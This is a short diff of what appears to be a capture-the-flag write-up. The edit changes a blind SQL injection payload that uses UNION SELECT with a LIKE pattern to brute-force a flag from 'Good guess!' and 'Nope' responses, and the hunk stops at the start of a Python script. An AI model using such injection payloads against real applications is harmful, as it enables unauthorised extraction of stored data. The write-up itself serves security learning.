@@ -24,7 +24,7 @@ Finding the column name needs a bit of guessing. I tried `message` but shows err
 
 Now we can use the column name to get the flag by bruteforcing it with output based "Good guess!" and "Nope".
 
-The payload: `guess=1 UNION SELECT 1 FROM secret where flag like "UDCTF{%";`
+The payload: `guess=1 UNION SELECT 1 FROM secret where flag like "UDCTF{\%";`
 
 ```python
 import requests
